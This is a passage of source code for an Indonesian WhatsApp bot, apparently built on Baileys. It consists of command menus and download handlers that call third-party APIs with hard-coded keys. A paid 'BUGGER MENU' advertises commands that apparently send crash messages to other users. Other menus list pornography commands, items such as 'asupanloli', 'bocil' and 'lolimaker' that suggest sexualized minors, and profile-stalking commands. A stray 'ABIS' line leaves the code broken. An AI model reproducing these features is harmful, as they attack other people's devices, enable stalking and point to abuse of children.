${gaya2} ${prefix}robotr2d2 _Teks_
${gaya2} ${prefix}harrypotter _Teks_
${gaya2} ${prefix}glitch3 _Teks_
${gaya2} ${prefix}greenhorror _Teks_
${gaya2} ${prefix}horrorgift _Teks_
${gaya2} ${prefix}erodedmetal _Teks_
${gaya2} ${prefix}3dglowingmetal _Teks_
${gaya2} ${prefix}blackmetal _Teks_
${gaya2} ${prefix}bluemetal _Teks_
${gaya2} ${prefix}shynimetal _Teks_
${gaya2} ${prefix}rustymetal _Teks_
${gaya2} ${prefix}metalpurple _Teks_
${gaya2} ${prefix}metalrainbow _Teks_
${gaya2} ${prefix}metaldarkgold _Teks_
${gaya2} ${prefix}colorfullluxurymetal _Teks_
${gaya2} ${prefix}glossybluemetal _Teks_
${gaya2} ${prefix}3dglossymetal _Teks_
${gaya2} ${prefix}3ddeepseametal _Teks_
${gaya2} ${prefix}leddisplayscreen _Teks_
${gaya2} ${prefix}metallic _Teks_
${gaya2} ${prefix}glossymetallic _Teks_
${gaya2} ${prefix}christmastree _Teks_
${gaya2} ${prefix}sparklesmerrychristmas _Teks_
${gaya2} ${prefix}countryflag3d _Teks_
${gaya2} ${prefix}americanflag3d _Teks_
${gaya2} ${prefix}3dscfi _Teks_
${gaya2} ${prefix}3drainbow _Teks_
${gaya2} ${prefix}3dwaterpipe _Teks_
${gaya2} ${prefix}3dchrome _Teks_
${gaya2} ${prefix}bluegem _Teks_
${gaya2} ${prefix}purplegem _Teks_
${gaya2} ${prefix}pinkcandy _Teks_
${gaya2} ${prefix}transformer _Teks_
${gaya2} ${prefix}berry _Teks_
${gaya2} ${prefix}brokenglass _Teks_
${gaya2} ${prefix}3drealistic _Teks_
${gaya2} ${prefix}3dunderwater _Teks_
${gaya2} ${prefix}writeinsandsummerbeach _Teks_
${gaya2} ${prefix}sandwriting _Teks_
${gaya2} ${prefix}foilballoon _Teks_
${gaya2} ${prefix}3dglue _Teks_
${gaya2} ${prefix}1917 _Teks_
${gaya2} ${prefix}minion _Teks_
${gaya2} ${prefix}doubleexposure _Teks_
${gaya2} ${prefix}holographic3d _Teks_
${gaya2} ${prefix}deluxegold _Teks_
${gaya2} ${prefix}deluxesilver _Teks_
${gaya2} ${prefix}glossycarbon _Teks_
${gaya2} ${prefix}fabric _Teks_
${gaya2} ${prefix}xmascards3d _Teks_
${gaya2} ${prefix}wicker _Teks_
${gaya2} ${prefix}fireworksparkle _Teks_
${gaya2} ${prefix}skeleton _Teks_
${gaya2} ${prefix}ultragloss _Teks_
${gaya2} ${prefix}denim _Teks_
${gaya2} ${prefix}decorategreen _Teks_
${gaya2} ${prefix}peridot _Teks_
${gaya2} ${prefix}rock _Teks_
${gaya2} ${prefix}lava _Teks_
${gaya2} ${prefix}rainbowequalizer _Teks_
${gaya2} ${prefix}purpleglass _Teks_
${gaya2} ${prefix}decorativeglass _Teks_
${gaya2} ${prefix}chocolatecake _Teks_
${gaya2} ${prefix}strawberry _Teks_
${gaya2} ${prefix}koifish _Teks_
${gaya2} ${prefix}bread _Teks_
${gaya2} ${prefix}3dbox _Teks_
${gaya2} ${prefix}freeadvancedglow _Teks_
${gaya2} ${prefix}honey _Teks_
${gaya2} ${prefix}marble _Teks_
${gaya2} ${prefix}marbleslabs _Teks_
${gaya2} ${prefix}icecold _Teks_
${gaya2} ${prefix}fruitjuice _Teks_
${gaya2} ${prefix}abstragold _Teks_
${gaya2} ${prefix}biscuit _Teks_
${gaya2} ${prefix}bagel _Teks_
${gaya2} ${prefix}wood _Teks_
${gaya2} ${prefix}hexagolden _Teks_
${gaya2} ${prefix}wonderfulgraffitiart _Teks_
${gaya2} ${prefix}8bit _Teks1&Teks2_
${gaya2} ${prefix}pornhub _Teks1&Teks2_
${gaya2} ${prefix}glitch _Teks1&Teks2_
${gaya2} ${prefix}glitch2 _Teks1&Teks2_
${gaya2} ${prefix}layered _Teks1&Teks2_
${gaya2} ${prefix}3dsteel _Teks1&Teks2_
${gaya2} ${prefix}realistic _Teks1&Teks2_
${gaya2} ${prefix}lionlogo _Teks1&Teks2_
${gaya2} ${prefix}ninjalogo _Teks1&Teks2_
${gaya2} ${prefix}wolf _Teks1&Teks2_
${gaya2} ${prefix}wolf2 _Teks1&Teks2_
${gaya2} ${prefix}halloween3 _Teks1&Teks2_
${gaya2} ${prefix}marvel _Teks1&Teks2_
${gaya2} ${prefix}marvel2 _Teks1&Teks2_
${gaya2} ${prefix}cinematichorror _Teks1&Teks2_
${gaya2} ${prefix}avengers _Teks1&Teks2_
${gaya2} ${prefix}graffiti3 _Teks1&Teks2_
${gaya2} ${prefix}captainamerica _Teks1&Teks2_
${gaya2} ${prefix}girlneko _Teks1&Teks2_
${gaya2} ${prefix}sadboy _Teks1&Teks2_
${gaya2} ${prefix}makerkaneki _Teks1&Teks2_
${gaya2} ${prefix}rem _Teks1&Teks2_
${gaya2} ${prefix}lolimaker _Teks1&Teks2_
${gaya2} ${prefix}gura _Teks1&Teks2_
${gaya2} ${prefix}donaldtweet _Text_
${gaya2} ${prefix}tololserti _Text_
${gaya2} ${prefix}goodboyserti _Text_
${gaya2} ${prefix}bearlogo _Text_
${gaya2} ${prefix}catlogo _Text_
${gaya2} ${prefix}foxlogo _Text_
${gaya2} ${prefix}zenitshu _Teks1&Teks2_
${gaya2} ${prefix}tanjirou _Teks1&Teks2_
${gaya2} ${prefix}mikasagfx _Teks1&Teks2_
${gaya2} ${prefix}doumagfx _Teks1&Teks2_
${gaya2} ${prefix}doumagfx2 _Teks_
${gaya2} ${prefix}luffygfx _Teks1&Teks2_
`
		gbutsan = [
			{ buttonId: `${prefix}donasi`, buttonText: { displayText: 'DONASI' }, type: 1 },
			{ buttonId: `${prefix}command`, buttonText: { displayText: 'BACK' }, type: 1 }
		]
		mhan = await Revoer.prepareMessage(from, ofrply, image, { thumbnail: ofrply })
		const sendBtnMn4 = {
			imageMessage: mhan.message.imageMessage,
			contentText: `${menu}`,
			footerText: `* _${tanggal}_*`,
			buttons: gbutsan,
			headerType: 4
		}
		Revoer.sendMessage(from, sendBtnMn4, MessageType.buttonsMessage, { quoted: fgi, contextInfo: { mentionedJid: [sender] } })
		break
case 'randomtext':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
menu =
`*「 RANDOM TEXT 」*

${gaya2} ${prefix}faktaunik
${gaya2} ${prefix}faktahorror
${gaya2} ${prefix}truth
${gaya2} ${prefix}dare
${gaya2} ${prefix}pantun
${gaya2} ${prefix}puisi
${gaya2} ${prefix}quotes
${gaya2} ${prefix}quoteskanye
${gaya2} ${prefix}quotesislami
${gaya2} ${prefix}quotesanime
${gaya2} ${prefix}quotesdilan
${gaya2} ${prefix}quotesff
${gaya2} ${prefix}quotespubg
${gaya2} ${prefix}quoteshacker
${gaya2} ${prefix}katabijak
${gaya2} ${prefix}katailham
${gaya2} ${prefix}katasindiran
${gaya2} ${prefix}katabucin
${gaya2} ${prefix}katabucin2
${gaya2} ${prefix}kataml
${gaya2} ${prefix}katagalau
${gaya2} ${prefix}katagombal
${gaya2} ${prefix}cerpen
${gaya2} ${prefix}cersex
${gaya2} ${prefix}cercin
${gaya2} ${prefix}cerror
`

		gbutsan = [
			{ buttonId: `${prefix}donasi`, buttonText: { displayText: 'DONASI' }, type: 1 },
			{ buttonId: `${prefix}command`, buttonText: { displayText: 'BACK' }, type: 1 }
		]
		mhan = await Revoer.prepareMessage(from, ofrply, image, { thumbnail: ofrply })
		const sendBtnMn5 = {
			imageMessage: mhan.message.imageMessage,
			contentText: `${menu}`,
			footerText: `* _${tanggal}_*`,
			buttons: gbutsan,
			headerType: 4
		}
		Revoer.sendMessage(from, sendBtnMn5, MessageType.buttonsMessage, { quoted: fgi, contextInfo: { mentionedJid: [sender] } })
		break
case 'randomimage':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
menu =
`*「 RANDOM IMAGE 」*

${gaya2} ${prefix}ppcouple
${gaya2} ${prefix}meme
${gaya2} ${prefix}memeindo
${gaya2} ${prefix}quotesimage
${gaya2} ${prefix}katakataimage
${gaya2} ${prefix}renungan
${gaya2} ${prefix}darkjokes
${gaya2} ${prefix}aesthetic
${gaya2} ${prefix}wallpaperhacker
${gaya2} ${prefix}wallpaperhacker2
${gaya2} ${prefix}wallpaperharley
${gaya2} ${prefix}wallpaperjoker
${gaya2} ${prefix}wallpaperpubg
${gaya2} ${prefix}wallpaperhp
${gaya2} ${prefix}wallpaperhp2
${gaya2} ${prefix}wallpaperkpop
${gaya2} ${prefix}wallpaperblackpink
${gaya2} ${prefix}wallpapergame
${gaya2} ${prefix}cosplayer`
		gbutsan = [
			{ buttonId: `${prefix}donasi`, buttonText: { displayText: 'DONASI' }, type: 1 },
			{ buttonId: `${prefix}command`, buttonText: { displayText: 'BACK' }, type: 1 }
		]
		mhan = await Revoer.prepareMessage(from, ofrply, image, { thumbnail: ofrply })
		const sendBtnMn6 = {
			imageMessage: mhan.message.imageMessage,
			contentText: `${menu}`,
			footerText: `* _${tanggal}_*`,
			buttons: gbutsan,
			headerType: 4
		}
		Revoer.sendMessage(from, sendBtnMn6, MessageType.buttonsMessage, { quoted: fgi, contextInfo: { mentionedJid: [sender] } })
		break

case 'randomvideo':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
menu =
`*「 RANDOM VIDEO 」*

${gaya2} ${prefix}beatvn
${gaya2} ${prefix}randombokep
${gaya2} ${prefix}jedagjedugff
${gaya2} ${prefix}jedagjedugml
${gaya2} ${prefix}jedagjedugpubg
${gaya2} ${prefix}storywa
${gaya2} ${prefix}storygalau
${gaya2} ${prefix}storytruk
${gaya2} ${prefix}storybus
${gaya2} ${prefix}storysholawatan
${gaya2} ${prefix}storyanime
${gaya2} ${prefix}clipclap
${gaya2} ${prefix}tiktokporn`
		gbutsan = [
			{ buttonId: `${prefix}donasi`, buttonText: { displayText: 'DONASI' }, type: 1 },
			{ buttonId: `${prefix}command`, buttonText: { displayText: 'BACK' }, type: 1 }
		]
		mhan = await Revoer.prepareMessage(from, ofrply, image, { thumbnail: ofrply })
		const sendBtnMn7 = {
			imageMessage: mhan.message.imageMessage,
			contentText: `${menu}`,
			footerText: `* _${tanggal}_*`,
			buttons: gbutsan,
			headerType: 4
		}
		Revoer.sendMessage(from, sendBtnMn7, MessageType.buttonsMessage, { quoted: fgi, contextInfo: { mentionedJid: [sender] } })
		break

case 'asupanmenu':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

menu =
`*「 ASUPAN MENU 」*

${gaya2} ${prefix}asupan
${gaya2} ${prefix}asupanloli
${gaya2} ${prefix}hijaber
${gaya2} ${prefix}bocil
${gaya2} ${prefix}rikagusriani
${gaya2} ${prefix}santuy
${gaya2} ${prefix}ukhty
${gaya2} ${prefix}gheayubi
${gaya2} ${prefix}bacol`
		gbutsan = [
			{ buttonId: `${prefix}donasi`, buttonText: { displayText: 'DONASI' }, type: 1 },
			{ buttonId: `${prefix}command`, buttonText: { displayText: 'BACK' }, type: 1 }
		]
		mhan = await Revoer.prepareMessage(from, ofrply, image, { thumbnail: ofrply })
		const sendBtnMn8 = {
			imageMessage: mhan.message.imageMessage,
			contentText: `${menu}`,
			footerText: `* _${tanggal}_*`,
			buttons: gbutsan,
			headerType: 4
		}
		Revoer.sendMessage(from, sendBtnMn8, MessageType.buttonsMessage, { quoted: fgi, contextInfo: { mentionedJid: [sender] } })
		break
case 'cecanmenu':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
menu =
`*「 CECAN MENU 」*

${gaya2} ${prefix}cogan
${gaya2} ${prefix}cecan
${gaya2} ${prefix}cecan2
${gaya2} ${prefix}cogan2
${gaya2} ${prefix}jeni
${gaya2} ${prefix}jiso
${gaya2} ${prefix}justina
${gaya2} ${prefix}lisa
${gaya2} ${prefix}rose
${gaya2} ${prefix}ryujin
${gaya2} ${prefix}china
${gaya2} ${prefix}vietnam
${gaya2} ${prefix}thainlad
${gaya2} ${prefix}indonesia
${gaya2} ${prefix}korea
${gaya2} ${prefix}japan
${gaya2} ${prefix}malaysia`
		gbutsan = [
			{ buttonId: `${prefix}donasi`, buttonText: { displayText: 'DONASI' }, type: 1 },
			{ buttonId: `${prefix}command`, buttonText: { displayText: 'BACK' }, type: 1 }
		]
		mhan = await Revoer.prepareMessage(from, ofrply, image, { thumbnail: ofrply })
		const sendBtnMn9 = {
			imageMessage: mhan.message.imageMessage,
			contentText: `${menu}`,
			footerText: `* _${tanggal}_*`,
			buttons: gbutsan,
			headerType: 4
		}
		Revoer.sendMessage(from, sendBtnMn9, MessageType.buttonsMessage, { quoted: fgi, contextInfo: { mentionedJid: [sender] } })
		break
case 'animemenu':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
menu =
`*「 ANIME MENU 」*

${gaya2} ${prefix}naruto
${gaya2} ${prefix}loli
${gaya2} ${prefix}waifu
${gaya2} ${prefix}neko
${gaya2} ${prefix}husbu
${gaya2} ${prefix}milf
${gaya2} ${prefix}cosplay
${gaya2} ${prefix}nekonime
${gaya2} ${prefix}shota
${gaya2} ${prefix}wallml
${gaya2} ${prefix}akira
${gaya2} ${prefix}akiyama
${gaya2} ${prefix}ana
${gaya2} ${prefix}asuna
${gaya2} ${prefix}ayuzawa
${gaya2} ${prefix}boruto
${gaya2} ${prefix}chiho
${gaya2} ${prefix}chitoge
${gaya2} ${prefix}deidara
${gaya2} ${prefix}eba
${gaya2} ${prefix}elaina
${gaya2} ${prefix}emilia
${gaya2} ${prefix}erza
${gaya2} ${prefix}gremory
${gaya2} ${prefix}hestia
${gaya2} ${prefix}hinata
${gaya2} ${prefix}isuzu
${gaya2} ${prefix}itachi
${gaya2} ${prefix}itori
${gaya2} ${prefix}kagura
${gaya2} ${prefix}kakasih
${gaya2} ${prefix}kaori
${gaya2} ${prefix}kaneki
${gaya2} ${prefix}kotori
${gaya2} ${prefix}kurumi
${gaya2} ${prefix}madara
${gaya2} ${prefix}mikasa
${gaya2} ${prefix}miku
${gaya2} ${prefix}minato
${gaya2} ${prefix}nezuko
${gaya2} ${prefix}rize
${gaya2} ${prefix}sagiri
${gaya2} ${prefix}sakura
${gaya2} ${prefix}sasuke
${gaya2} ${prefix}shina
${gaya2} ${prefix}shinka
${gaya2} ${prefix}shinomiya
${gaya2} ${prefix}shizuka
${gaya2} ${prefix}tejina
${gaya2} ${prefix}toukachan
${gaya2} ${prefix}tsunade
${gaya2} ${prefix}yotsuba
${gaya2} ${prefix}yuki
${gaya2} ${prefix}yumeko
${gaya2} ${prefix}fanart
${gaya2} ${prefix}nino
${gaya2} ${prefix}manga`
		gbutsan = [
			{ buttonId: `${prefix}donasi`, buttonText: { displayText: 'DONASI' }, type: 1 },
			{ buttonId: `${prefix}command`, buttonText: { displayText: 'BACK' }, type: 1 }
		]
		mhan = await Revoer.prepareMessage(from, ofrply, image, { thumbnail: ofrply })
		const sendBtnMn10 = {
			imageMessage: mhan.message.imageMessage,
			contentText: `${menu}`,
			footerText: `* _${tanggal}_*`,
			buttons: gbutsan,
			headerType: 4
		}
		Revoer.sendMessage(from, sendBtnMn10, MessageType.buttonsMessage, { quoted: fgi, contextInfo: { mentionedJid: [sender] } })
		break

case 'nsfwmenu':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (!isDonasi) return reply('Bukan User Premium Kok Mau Ngocox? Donasi Dulu Sini Ntar Bisa Ngocox Sepuasnya')
menu =
`*「 NSFW MENU 」*

${gaya2} ${prefix}ass
${gaya2} ${prefix}ahegao
${gaya2} ${prefix}bdsm
${gaya2} ${prefix}blowjob
${gaya2} ${prefix}cuckold
${gaya2} ${prefix}cum
${gaya2} ${prefix}ero
${gaya2} ${prefix}femdom
${gaya2} ${prefix}foot
${gaya2} ${prefix}gangbang
${gaya2} ${prefix}glasses
${gaya2} ${prefix}hentai
${gaya2} ${prefix}jahy
${gaya2} ${prefix}masturbation
${gaya2} ${prefix}neko
${gaya2} ${prefix}orgy
${gaya2} ${prefix}panties
${gaya2} ${prefix}pussy
${gaya2} ${prefix}thighs
${gaya2} ${prefix}yuri
${gaya2} ${prefix}hentaivid`
		gbutsan = [
			{ buttonId: `${prefix}donasi`, buttonText: { displayText: 'DONASI' }, type: 1 },
			{ buttonId: `${prefix}command`, buttonText: { displayText: 'BACK' }, type: 1 }
		]
		mhan = await Revoer.prepareMessage(from, ofrply, image, { thumbnail: ofrply })
		const sendBtnMn11 = {
			imageMessage: mhan.message.imageMessage,
			contentText: `${menu}`,
			footerText: `* _${tanggal}_*`,
			buttons: gbutsan,
			headerType: 4
		}
		Revoer.sendMessage(from, sendBtnMn11, MessageType.buttonsMessage, { quoted: fgi, contextInfo: { mentionedJid: [sender] } })
		break

case 'stickermenu':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
menu =
`*「 STICKER MENU 」*

${gaya2} ${prefix}sticker _reply_
${gaya2} ${prefix}toimg _reply_
${gaya2} ${prefix}smeme Atas|Bawah
${gaya2} ${prefix}ttp _Teks_
${gaya2} ${prefix}ttp2 _Teks_
${gaya2} ${prefix}ttp3 _Teks_
${gaya2} ${prefix}ttp4 _Teks_
${gaya2} ${prefix}ttp5 _Teks_
${gaya2} ${prefix}ttp6 _Teks_
${gaya2} ${prefix}ttp7 _Teks_
${gaya2} ${prefix}attp _Teks_
${gaya2} ${prefix}stickergura
${gaya2} ${prefix}randomsticker
${gaya2} ${prefix}stikerpatrick
${gaya2} ${prefix}stikeramongus
${gaya2} ${prefix}stikerdoge
`
		gbutsan = [
			{ buttonId: `${prefix}donasi`, buttonText: { displayText: 'DONASI' }, type: 1 },
			{ buttonId: `${prefix}command`, buttonText: { displayText: 'BACK' }, type: 1 }
		]
		mhan = await Revoer.prepareMessage(from, ofrply, image, { thumbnail: ofrply })
		const sendBtnMn12 = {
			imageMessage: mhan.message.imageMessage,
			contentText: `${menu}`,
			footerText: `* _${tanggal}_*`,
			buttons: gbutsan,
			headerType: 4
		}
		Revoer.sendMessage(from, sendBtnMn12, MessageType.buttonsMessage, { quoted: fgi, contextInfo: { mentionedJid: [sender] } })
		break

case 'othermenu':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
menu =
`*「 OTHER MENU 」*

${gaya2} ${prefix}runtime
${gaya2} ${prefix}speed
${gaya2} ${prefix}infosc
${gaya2} ${prefix}sewabot
${gaya2} ${prefix}payment
${gaya2} ${prefix}owner
${gaya2} ${prefix}sc
${gaya2} ${prefix}ssweb _Url_
${gaya2} ${prefix}delete _Reply pesan bot_
${gaya2} ${prefix}shorturl
${gaya2} ${prefix}kisahnabi (Muhammad)
${gaya2} ${prefix}whois (url)
${gaya2} ${prefix}tts (teks)
${gaya2} ${prefix}citacita
${gaya2} ${prefix}fancytext (text)
${gaya2} ${prefix}qrcode (teks/link)
${gaya2} ${prefix}namajepang
${gaya2} ${prefix}morse _Text_
${gaya2} ${prefix}morsetr _MorseCode_
${gaya2} ${prefix}topdf (Tag Gambar) _Nama File_
${gaya2} ${prefix}repeat _Text_
${gaya2} ${prefix}hitungwr _Match/Wr Sekarang/Wr Tujuan_
${gaya2} ${prefix}stalkig _Username_
${gaya2} ${prefix}stalktiktok _Username_
`
		gbutsan = [
			{ buttonId: `${prefix}donasi`, buttonText: { displayText: 'DONASI' }, type: 1 },
			{ buttonId: `${prefix}command`, buttonText: { displayText: 'BACK' }, type: 1 }
		]
		mhan = await Revoer.prepareMessage(from, ofrply, image, { thumbnail: ofrply })
		const sendBtnMn13 = {
			imageMessage: mhan.message.imageMessage,
			contentText: `${menu}`,
			footerText: `* _${tanggal}_*`,
			buttons: gbutsan,
			headerType: 4
		}
		Revoer.sendMessage(from, sendBtnMn13, MessageType.buttonsMessage, { quoted: fgi, contextInfo: { mentionedJid: [sender] } })
		break
	case 'editmenu':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,Donasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)
		menu =
			`*「 EDITOR MENU 」*

HARAP TAG GAMBAR / VIDEO

${gaya2} ${prefix}trash
${gaya2} ${prefix}gay
${gaya2} ${prefix}removebg
${gaya2} ${prefix}jail
${gaya2} ${prefix}rounded
${gaya2} ${prefix}tocartoon
${gaya2} ${prefix}pencil
${gaya2} ${prefix}buriq
${gaya2} ${prefix}bikinmeme (teks1&teks2)
${gaya2} ${prefix}reverse*
${gaya2} ${prefix}slow*
${gaya2} ${prefix}faster*
${gaya2} ${prefix}hitamputih*
${gaya2} ${prefix}mirror*
${gaya2} ${prefix}nosound*
${gaya2} ${prefix}tomp3*
`
		gbutsan = [
			{ buttonId: `${prefix}donasi`, buttonText: { displayText: 'DONASI' }, type: 1 },
			{ buttonId: `${prefix}command`, buttonText: { displayText: 'BACK' }, type: 1 }
		]
		mhan = await Revoer.prepareMessage(from, ofrply, image, { thumbnail: ofrply })
		const sendBtnMn14 = {
			imageMessage: mhan.message.imageMessage,
			contentText: `${menu}`,
			footerText: `* _${tanggal}_*`,
			buttons: gbutsan,
			headerType: 4
		}
		Revoer.sendMessage(from, sendBtnMn14, MessageType.buttonsMessage, { quoted: fgi, contextInfo: { mentionedJid: [sender] } })
		break

	case 'audiomenu':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,Donasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)
		menu =
			`*「 VOICE CHANGER 」*

HARAP TAG AUDIO

${gaya2}  ${prefix}tupai reply audio
${gaya2}  ${prefix}bass reply audio
${gaya2}  ${prefix}gemok (reply AUDIO) 
${gaya2}  ${prefix}gemes (reply AUDIO) 
${gaya2}  ${prefix}fast (reply AUDIO)
${gaya2}  ${prefix}robot (reply AUDIO) 
${gaya2}  ${prefix}nightcore (reply AUDIO) 
${gaya2}  ${prefix}ghost (reply AUDIO) 
${gaya2}  ${prefix}imut (reply AUDIO) 
${gaya2}  ${prefix}hode (reply AUDIO)
${gaya2}  ${prefix}tempo (reply AUDIO)
${gaya2}  ${prefix}budek (reply AUDIO)`
		gbutsan = [
			{ buttonId: `${prefix}donasi`, buttonText: { displayText: 'DONASI' }, type: 1 },
			{ buttonId: `${prefix}command`, buttonText: { displayText: 'BACK' }, type: 1 }
		]
		mhan = await Revoer.prepareMessage(from, ofrply, image, { thumbnail: ofrply })
		const sendBtnMn15 = {
			imageMessage: mhan.message.imageMessage,
			contentText: `${menu}`,
			footerText: `* _${tanggal}_*`,
			buttons: gbutsan,
			headerType: 4
		}
		Revoer.sendMessage(from, sendBtnMn15, MessageType.buttonsMessage, { quoted: fgi, contextInfo: { mentionedJid: [sender] } })
		break

case 'ownermenu':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
menu =
`*「 OWNER MENU 」*

${gaya2} ${prefix}bc _Teks_
${gaya2} ${prefix}bc2 _Teks_
${gaya2} ${prefix}bcgc _Teks_
${gaya2} ${prefix}setnamabot _Teks_
${gaya2} ${prefix}setbio _Teks_
${gaya2} ${prefix}setppbot _Reply Image_
${gaya2} ${prefix}autoread _On / Off_
${gaya2} ${prefix}autoketik _On / Off_
${gaya2} ${prefix}autovn _On / Off_
${gaya2} ${prefix}clearall
${gaya2} ${prefix}public
${gaya2} ${prefix}self`

		gbutsan = [
			{ buttonId: `${prefix}donasi`, buttonText: { displayText: 'DONASI' }, type: 1 },
			{ buttonId: `${prefix}command`, buttonText: { displayText: 'BACK' }, type: 1 }
		]
		mhan = await Revoer.prepareMessage(from, ofrply, image, { thumbnail: ofrply })
		const sendBtnMn16 = {
			imageMessage: mhan.message.imageMessage,
			contentText: `${menu}`,
			footerText: `* _${tanggal}_*`,
			buttons: gbutsan,
			headerType: 4
		}
		Revoer.sendMessage(from, sendBtnMn16, MessageType.buttonsMessage, { quoted: fgi, contextInfo: { mentionedJid: [sender] } })
		break
	case 'bugmenu':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		if (!isDonasi) return reply(`Upss Mystery Menu Tidak Dapat Diakses Karna Fitur Ini Khusus Orang Baik Yang Donasi\nJika Merasa Sudah Donasi Hubungi Owner Yaa..`)
		menu =
			`*「 BUGGER MENU 」*

${gaya2} ${prefix}bugsw (Tag Gambar)
${gaya2} ${prefix}bugvideo ( Tag Video )
${gaya2} ${prefix}bugcatalog (TagGambar)
${gaya2} ${prefix}buglokasi (Nama)
${gaya2} ${prefix}troliv2 (Nama)
${gaya2} ${prefix}bugpdf
${gaya2} ${prefix}bugtext
${gaya2} ${prefix}bugweb (Nama)`
		gbutsan = [
			{ buttonId: `${prefix}donasi`, buttonText: { displayText: 'DONASI' }, type: 1 },
			{ buttonId: `${prefix}command`, buttonText: { displayText: 'BACK' }, type: 1 }
		]
		mhan = await Revoer.prepareMessage(from, ofrply, image, { thumbnail: ofrply })
		const sendBtnMn = {
			imageMessage: mhan.message.imageMessage,
			contentText: `${menu}`,
			footerText: `* _${ tanggal }_*`,
			buttons: gbutsan,
			headerType: 4
		}
		Revoer.sendMessage(from, sendBtnMn, MessageType.buttonsMessage, { quoted: fgi, contextInfo: { mentionedJid: [sender] } })
		break

	case 'delcmd':
		if (!isQuotedSticker) return reply(`Penggunaan : ${command} tagsticker`)
		var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
		_scommand.splice(getCommandPosition(kodenya), 1)
		fs.writeFileSync('./database/scommand.json', JSON.stringify(_scommand))
		reply("Done!")
		break
	case 'listcmd':
		let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
		let cemde = [];
		for (let i of _scommand) {
			cemde.push(i.id)
			teksnyee += `\n\n➸ ID : ${i.id}\n➸ Cmd : ${i.chats}`
		}
		mentions(teksnyee, cemde, true)
		break
//══════════[ SEWA DLL ]══════════//

	ABIS

//══════════[ FITUR DOWNLOAD ]══════════//
/*Nyolong case ?
kasih credit ajg / tambah in di tqtq
--> RevoerGans*/

case 'ytmp3':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply("Masukkan url youtube")
url = args.join(' ')
		anu = await fetchJson(`https://viko-api.herokuapp.com/api/download/ytmp3?url=${url}&apikey=vinko`)
ytmp3 = await getBuffer(anu.result.url)
reply(`_audio sedang diproses, silahkan tunggu beberapa saat lagi_`)
Revoer.sendMessage(from, ytmp3, audio, {mimetype:"audio/mp4", quoted:mek})
break
case 'ytmp4':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (args.length < 1) return reply("Masukkan url youtube")
url = args.join(' ')
		anu = await fetchJson(`https://viko-api.herokuapp.com/api/download/ytmp4?url=${url}&apikey=vinko`)
ytmp4 = await getBuffer(anu.result.url)
		reply(`_Proses Download Video Sedang Berlangsung Mohon Tunggu..._`)
		reply('*_Download Selesai, Mengirim Video Ke WhatsApp..._*')
Revoer.sendMessage(from, ytmp4, video, {caption:`Done kak`, thumbnail:Buffer.alloc(0), quoted:mek})
break
case 'tiktok':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
menu = `Hi ${pushname}
Kakak pasti kepingin download
Video / audio dari tiktok 🐣
Silakan pilih salah satu


• ${prefix}ttwm _Link_
• ${prefix}ttnowm _Link_
• ${prefix}ttaudio _Link_`
fakeitem(menu)
break
case 'tiktoknowm':
case 'ttnowm':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
anu = await fetchJson(`https://apidhani.herokuapp.com/api/download/tiktok?url=${q}&apikey=${dhakey}`)
tiktok = await getBuffer(anu.result.nowatermark)
Revoer.sendMessage(from, tiktok, video, {quoted: mek, caption : 'Done bro'})
break
case 'tiktokwm':
case 'ttwm':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
anu = await fetchJson(`https://apidhani.herokuapp.com/api/download/tiktok?url=${q}&apikey=${dhakey}`)
tiktok = await getBuffer(anu.result.watermark)
Revoer.sendMessage(from, tiktok, video, {quoted: mek, caption : 'Done bro'})
		break
	case 'instadl':
		case 'igdl':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		anu = await fetchJson(`https://apidhani.herokuapp.com/api/download/igdl?url=${q}&apikey=${dhakey}`)
		try {
			insta = await getBuffer(anu.result.url)
			Revoer.sendMessage(from, insta, video, { quoted: mek, caption: 'Done bro' })
		} catch {
			Revoer.sendMessage(from,`Error Saat Mendownload Video` ,text)
        }
break
case 'tiktokaudio':
case 'ttaudio':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
		anu = await getBuffer(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=${LolKey}&url=${q}`)
Revoer.sendMessage(from, anu, audio, {mimetype : 'audio/mp4',quoted: mek,filename:'RevzBotz||TT AUDIO.oggd'})
break
	case 'tts':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		anu = await getBuffer(`https://hadi-api.herokuapp.com/api/tts?language=id&text=${q}`)
